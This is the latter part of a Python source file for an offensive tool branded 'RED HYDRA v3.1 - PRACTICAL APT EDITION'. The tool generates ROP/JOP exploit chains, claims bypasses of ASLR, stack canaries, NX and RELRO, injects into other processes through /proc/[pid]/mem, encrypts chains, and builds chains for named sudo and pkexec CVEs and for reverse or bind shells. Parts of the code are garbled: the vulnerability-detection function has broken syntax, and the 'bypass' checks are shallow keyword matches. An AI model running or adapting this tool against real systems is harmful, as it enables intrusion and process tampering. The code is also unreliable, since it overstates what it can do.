        self.find_gadgets_parallel(8)
        self.find_jop_gadgets()
        self.practical_protections = self.practical_bypass_protections()
        log.info(f"Enhanced analysis complete: {len(self.gadgets)} ROP, {len(self.jop_gadgets)} JOP gadgets found")
    
    def get_cve_template(self, cve_id: str) -> Optional[List[Dict]]:
        """Шаблоны для реальных CVE"""
        return CVE_TEMPLATES.get(cve_id)
    
    def practical_bypass_protections(self) -> Dict[str, bool]:
        """Практические методы обхода защит"""
        protections = {
            "ASLR": self._practical_bypass_aslr(),
            "StackCanary": self._practical_bypass_canary(),
            "NX": self._practical_bypass_nx(),
            "RELRO": self._practical_bypass_relro()
        }
        return protections
    
    def _practical_bypass_aslr(self) -> bool:
        """Обход ASLR через утечку адресов"""
        leak_gadgets = [
            g for g in self.gadgets 
            if any('mov' in op.lower() and any(r in ' '.join(g.instructions) 
                   for r in ['rdi', 'rsi', 'rdx', 'rcx']) for op in g.operations)
            and any('call' in op.lower() for op in g.operations)
        ]
        result = len(leak_gadgets) > 0
        log.info(f"ASLR bypass {'possible' if result else 'difficult'} - found {len(leak_gadgets)} leak gadgets")
        return result
    
    def _practical_bypass_canary(self) -> bool:
        """Обход Stack Canaries"""
        canary_gadgets = [
            g for g in self.gadgets
            if any('mov' in op.lower() and 'fs:' in ' '.join(g.instructions) for op in g.operations)
        ]
        result = len(canary_gadgets) > 0
        log.info(f"Stack Canary bypass {'possible' if result else 'difficult'} - found {len(canary_gadgets)} canary gadgets")
        return result
    
    def _practical_bypass_nx(self) -> bool:
        """Обход NX через ROP/JOP"""
        syscall_gadgets = [g for g in self.gadgets if g.semantic_type == SemanticType.SYSTEM]
        result = len(syscall_gadgets) > 0
        log.info(f"NX bypass {'possible' if result else 'difficult'} - found {len(syscall_gadgets)} syscall gadgets")
        return result
    
    def _practical_bypass_relro(self) -> bool:
        """Обход RELRO через GOT overwrite"""
       
        write_gadgets = [
            g for g in self.gadgets
            if any('mov' in op.lower() and '[' in ' '.join(g.instructions) for op in g.operations)
        ]
        result = len(write_gadgets) > 0
        log.info(f"RELRO bypass {'possible' if result else 'difficult'} - found {len(write_gadgets)} write gadgets")
        return result
    
    def practical_inject_into_process(self, pid: int) -> bool:
        """Практическое внедрение через /proc/[pid]/mem"""
        try:
            mem_path = f"/proc/{pid}/mem"
            if not os.path.exists(mem_path):
                log.error(f"/proc/{pid}/mem not accessible")
                return False
                
           
            maps_path = f"/proc/{pid}/maps"
            with open(maps_path, 'r') as f:
                maps = f.readlines()
                
            
            for line in maps:
                if 'r-xp' in line: 
                    parts = line.split()
                    addr_range = parts[0].split('-')
                    start_addr = int(addr_range[0], 16)
                    end_addr = int(addr_range[1], 16)
                    
                   
                    try:
                        with open(mem_path, 'rb+') as mem_file:
                            mem_file.seek(start_addr)
                            chain_data = b''.join(struct.pack('<Q', g.address) for g in self.gadgets[:5])
                            mem_file.write(chain_data)
                        log.info(f"Successfully injected into PID {pid} at 0x{start_addr:x}")
                        return True
                    except PermissionError:
                        continue
                    except Exception as e:
                        log.debug(f"Write failed at 0x{start_addr:x}: {e}")
                        continue
                        
            log.error(f"No suitable memory region found in PID {pid}")
            return False
            
        except Exception as e:
            log.error(f"Process injection failed: {e}")
            return False
    
    def practical_encrypt_chain(self, chain: List[Gadget], key: str = "red_hydra_secret") -> bytes:
        """Практическое шифрование цепи"""
        try:
            if PYCRYPTO_AVAILABLE:
                key_hash = hashlib.sha256(key.encode()).digest()
                chain_data = b''.join(g.bytes_data for g in chain)
                cipher = AES.new(key_hash, AES.MODE_CBC)
                iv = cipher.iv
                encrypted = cipher.encrypt(pad(chain_data, AES.block_size))
                log.info("Chain encrypted with AES-256-CBC")
                return iv + encrypted
            else:
                # Fallback: XOR "шифрование"
                key_bytes = key.encode()
                chain_data = b''.join(g.bytes_data for g in chain)
                encrypted = bytearray()
                for i, byte in enumerate(chain_data):
                    encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
                log.info("Chain encrypted with XOR (fallback)")
                return bytes(encrypted)
                
        except Exception as e:
            log.error(f"Encryption failed: {e}")
            # Ultimate fallback: return raw data
            return b''.join(g.bytes_data for g in chain)

# === AUTO-EXPLOIT DETECTION ===
def detect_vulnerability(binary_ bytes) -> str:
    patterns = {
        b"gets@": "stack_overflow",
        b"strcpy@": "stack_overflow",
        b"scanf@": "format_string",
        b"printf@": "format_string",
        b"memcpy@": "heap_overflow",
    }
    for pattern, vuln_type in patterns.items():
        if pattern in binary_
            return vuln_type
    return "unknown"

# === INTERACTIVE MODE ===
def interactive_mode(generator: ROPGenerator):
    log.info("RED HYDRA v3.1 Interactive Mode - PRACTICAL APT EDITION")
    log.info("Commands: find <type>, optimize <target>, export <format>, gadgets, stats, strings, auto, polymorph, jop, bypass, inject <pid>, encrypt [key], cve <id>, pe, quit")
    
    while True:
        try:
            cmd = input("\nred_hydra> ").strip()
            if cmd in ["quit", "exit"]:
                break
            elif cmd == "gadgets":
                for i, g in enumerate(generator.gadgets[:10]):
                    print(f"{i+1:2d}. 0x{g.address:x} | {g.semantic_type.value:12s} | {g.exploit_potential:.2f} | {'; '.join(g.instructions[:2])}")
            elif cmd == "jop":
                for i, g in enumerate(generator.jop_gadgets[:10]):
                    print(f"{i+1:2d}. 0x{g.address:x} | JOP | {'; '.join(g.instructions[:2])}")
            elif cmd == "stats":
                sc = Counter(g.security_level for g in generator.gadgets)
                for lvl, cnt in sc.items():
                    print(f"{lvl.value}: {cnt}")
            elif cmd.startswith("find "):
                stype = cmd.split(" ",1)[1]
                try:
                    sem = SemanticType(stype)
                    res = [g for g in generator.gadgets if g.semantic_type == sem]
                    for g in res[:5]:
                        print(f"0x{g.address:x}: {'; '.join(g.instructions)}")
                except:
                    print("Unknown type")
            elif cmd.startswith("optimize "):
                target = cmd.split(" ",1)[1]
                chain = generator.generate_exploit_chain({"type": target})
                for g in chain:
                    print(f"0x{g.address:x}: {'; '.join(g.instructions)}")
            elif cmd.startswith("export "):
                fmt = cmd.split(" ",1)[1]
                print(generator.export_chain(generator.gadgets[:5], fmt, generator.pie_mode))
            elif cmd == "strings":
                for s in ["/bin/sh", "sh", "/bin/bash"]:
                    addrs = generator.find_all_strings(s)
                    for addr in addrs:
                        print(f"[+] Found '{s}' at 0x{addr:x}")
            elif cmd == "auto":
                vuln = detect_vulnerability(generator.binary_data)
                log.info(f"Detected: {vuln}")
                chain = generator.generate_exploit_chain({"type": "execve" if vuln != "unknown" else "reverse_shell"})
                print(generator.export_chain(chain, "python", generator.pie_mode))
            elif cmd == "polymorph":
                chain = generator.gadgets[:5]
                mutated = generator.optimizer.polymorphic_engine.mutate_chain(chain)
                for i, (orig, mut) in enumerate(zip(chain, mutated)):
                    print(f"{i+1}. Orig: {orig.bytes_data.hex()} -> Mut: {mut.bytes_data.hex()}")
            elif cmd == "bypass":
                protections = generator.practical_bypass_protections()
                for prot, success in protections.items():
                    print(f"{prot}: {'✅' if success else '❌'}")
            elif cmd.startswith("inject "):
                try:
                    pid = int(cmd.split(" ",1)[1])
                    if generator.practical_inject_into_process(pid):
                        print(f"[+] Injected into PID {pid}")
                    else:
                        print(f"[-] Injection failed for PID {pid}")
                except:
                    print("Invalid PID")
            elif cmd.startswith("encrypt"):
                parts = cmd.split(" ", 1)
                key = parts[1] if len(parts) > 1 else "red_hydra_secret"
                encrypted = generator.practical_encrypt_chain(generator.gadgets[:3], key)
                print(f"Encrypted: {encrypted.hex()}")
            elif cmd.startswith("cve "):
                cve_id = cmd.split(" ",1)[1]
                template = generator.get_cve_template(cve_id)
                if template:
                    print(f"[+] Template for {cve_id}:")
                    for step in template:
                        print(f"    {step}")
                else:
                    print(f"[-] No template for {cve_id}")
            elif cmd == "pe":
                if generator.imports:
                    print("[+] PE Imports:")
                    for dll, funcs in generator.imports.items():
                        print(f"    {dll}: {len(funcs)} functions")
                if generator.pe_protections:
                    print("[+] PE Protections:")
                    for prot, enabled in generator.pe_protections.items():
                        print(f"    {prot}: {'ENABLED' if enabled else 'DISABLED'}")
            else:
                print("Commands: find, optimize, export, gadgets, stats, strings, auto, polymorph, jop, bypass, inject, encrypt, cve, pe, quit")
        except KeyboardInterrupt:
            break
        except Exception as e:
            log.error(f"Error: {e}")

# === MAIN ===
def setup_logging(verbosity: int):
    level = [logging.WARNING, logging.INFO, logging.DEBUG][min(verbosity, 2)]
    logging.basicConfig(level=level, format="%(asctime)s - %(levelname)s - %(message)s")

def validate_badchars(badchars_str: str) -> List[bytes]:
    badchars_hex = badchars_str.split(',')
    for bc in badchars_hex:
        if len(bc) % 2 != 0 or not all(c in '0123456789abcdefABCDEF' for c in bc):
            raise ValueError(f"Invalid badchar: {bc}")
    return [bytes.fromhex(bc) for bc in badchars_hex]

def main():
    parser = argparse.ArgumentParser(description="RED HYDRA v3.1 - PRACTICAL APT EDITION")
    parser.add_argument("binary", nargs='?', help="Target binary")
    parser.add_argument("-a", "--arch", default="x64", choices=["x86","x64","arm","arm64","riscv"])
    parser.add_argument("-l", "--length", type=int, default=8)
    parser.add_argument("-o", "--output")
    parser.add_argument("-f", "--format", default="python", choices=["python","json","raw","text"])
    parser.add_argument("-t", "--target", choices=["execve","reverse_shell","bind_shell","rce_via_stack","kernel_exploit"])
    parser.add_argument("--export-dir")
    parser.add_argument("--simulate", action="store_true")
    parser.add_argument("-i", "--interactive", action="store_true")
    parser.add_argument("--badchars", default="00,0a,0d,ff")
    parser.add_argument("-r", "--regex")
    parser.add_argument("--auto", action="store_true", help="Auto-detect vulnerability and generate chain")
    parser.add_argument("--pie", action="store_true", help="Force PIE mode")
    parser.add_argument("-v","--verbose", action="count", default=0, help="Increase verbosity")
    parser.add_argument("--seed", type=int, default=None, help="Seed for deterministic genetic optimization")
    parser.add_argument("--cve", help="Target specific CVE (CVE-2021-3156, CVE-2021-4034)")
    parser.add_argument("--pid", type=int, help="Target process ID for injection")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt ROP chain")
    parser.add_argument("--key", default="red_hydra_secret", help="Encryption key")
    parser.add_argument("--jop", action="store_true", help="Include JOP gadgets in analysis")
    
    args = parser.parse_args()
    
    setup_logging(args.verbose)
    
    try:
        badchars_list = validate_badchars(args.badchars)
    except ValueError as e:
        log.error(str(e))
        return
    
    if args.seed is not None:
        random.seed(args.seed)
        log.info(f"Genetic algorithm seeded with {args.seed} for deterministic results")
    
    if args.interactive and (args.output or args.format != "python"):
        log.warning("Ignoring --output/--format in interactive mode")
        args.output = None
        args.format = "python"
    
    print("\033[1;31m")
    print(r"   _____          __    __  .__  _____.__            __   ")
    print(r"  /  _  \  __ ___/  |__/  |_|__|/ ____\__| ____     |__| ____   ____  ")
    print(r" /  /_\  \|  |  \   __\   __\  \   __\|  |/ ___\    |  |/ __ \ / ___\ ")
    print(r"/    |    \  |  /|  |  |  | |  ||  |  |  \  \___    |  \  ___/ \  \___ ")
    print(r"\____|__  /____/ |__|  |__| |__||__|  |__|\___  >   |__|\___  >\___  >")
    print(r"        \/                                    \/            \/     \/ ")
    print("\033[0m")
    print("\033[1;33m[*] v3.1 - PRACTICAL APT EDITION: NO FANTASY, ONLY REAL-WORLD TOOLS\033[0m")
    
    if not args.binary and not args.interactive:
        log.info("No binary specified. Running demo on /lib/x86_64-linux-gnu/libc.so.6")
        import os
        libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
        if os.path.exists(libc_path):
            args.binary = libc_path
            args.arch = "x64"
            args.target = "execve"
        else:
            parser.print_help()
            return
    
    arch_map = {
        "x86": Architecture.X86,
        "x64": Architecture.X64,
        "arm": Architecture.ARM,
        "arm64": Architecture.ARM64,
        "riscv": Architecture.RISCV
    }
    
    try:
        generator = ROPGenerator(args.binary, arch_map[args.arch])
        generator.bad_chars = badchars_list
        
        if args.pie:
            generator.pie_mode = True
        
        if not generator.load_binary():
            return
        
        if args.simulate:
            log.info("SIMULATION MODE")
        
        # Enhanced analysis
        generator.enhanced_analysis()
        
        if args.jop:
            generator.find_jop_gadgets()
        
        if args.regex:
            pattern = re.compile(args.regex, re.IGNORECASE)
            matching = [g for g in generator.gadgets if any(pattern.search(instr) for instr in g.instructions)]
            for g in matching[:10]:
                print(f"0x{g.address:x}: {'; '.join(g.instructions)}")
            return
        
        if args.interactive:
            interactive_mode(generator)
            return
        
       
        if args.cve:
            template = generator.get_cve_template(args.cve)
            if template:
                log.info(f"Generating exploit for {args.cve}")
               
                chain = []
                for step in template:
                    if step["type"] == "pop":
                        
                        candidates = [g for g in generator.gadgets if f"pop {step['register']}" in ' '.join(g.instructions).lower()]
                        if candidates:
                            chain.append(max(candidates, key=lambda g: g.exploit_potential))
                    elif step["type"] == "call":
                        candidates = [g for g in generator.gadgets if 'call' in ' '.join(g.operations).lower()]
                        if candidates:
                            chain.append(max(candidates, key=lambda g: g.exploit_potential))
                    elif step["type"] == "syscall":
                        candidates = [g for g in generator.gadgets if g.semantic_type == SemanticType.SYSTEM]
                        if candidates:
                            chain.append(max(candidates, key=lambda g: g.exploit_potential))
                if not chain:
                    chain = generator.generate_exploit_chain({"type": "execve"})
            else:
                log.error(f"Unknown CVE: {args.cve}")
                return
        elif args.pid:
            if generator.practical_inject_into_process(args.pid):
                log.info(f"Successfully injected into PID {args.pid}")
            else:
                log.error(f"Failed to inject into PID {args.pid}")
            return
        elif args.auto:
            vuln_type = detect_vulnerability(generator.binary_data)
            log.info(f"Auto-detected vulnerability: {vuln_type}")
            target_type = "execve" if vuln_type != "unknown" else "reverse_shell"
            chain = generator.generate_exploit_chain({"type": target_type})
        elif args.target and not args.simulate:
            chain = generator.generate_exploit_chain({"type": args.target})
        else:
            
            log.info(f"Total gadgets: {len(generator.gadgets)}")
            log.info(f"JOP gadgets: {len(generator.jop_gadgets)}")
            protections = generator.practical_bypass_protections()
            log.info("Protection bypass status:")
            for prot, success in protections.items():
                log.info(f"  {prot}: {'POSSIBLE' if success else 'DIFFICULT'}")
            
            top = sorted(generator.gadgets, key=lambda g: g.exploit_potential, reverse=True)[:5]
            for g in top:
                print(f"0x{g.address:x} | {g.security_level.value:12s} | {g.exploit_potential:.2f} | {g.semantic_type.value:10s} | {'; '.join(g.instructions)}")
            return
        
        if 'chain' in locals() and chain:
            output_data = generator.export_chain(chain, args.format, generator.pie_mode)
            
            if args.encrypt:
                encrypted = generator.practical_encrypt_chain(chain, args.key)
                output_data = encrypted.hex()
                log.info("Chain encrypted")
            
            if args.export_dir:
                import os
                os.makedirs(args.export_dir, exist_ok=True)
                filename = f"{args.export_dir}/chain.{args.format if not args.encrypt else 'encrypted'}"
                with open(filename, 'w') as f:
                    f.write(output_data if isinstance(output_data, str) else output_data)
                log.info(f"Exported to {filename}")
            elif args.output:
                with open(args.output, 'w') as f:
                    f.write(output_data if isinstance(output_data, str) else output_data)
                log.info(f"Saved to {args.output}")
            else:
                print(output_data if isinstance(output_data, str) else output_data)
        else:
            log.error("Failed to generate chain")
    except Exception as e:
        log.error(f"Fatal error: {e}")

if __name__ == "__main__":
    main()
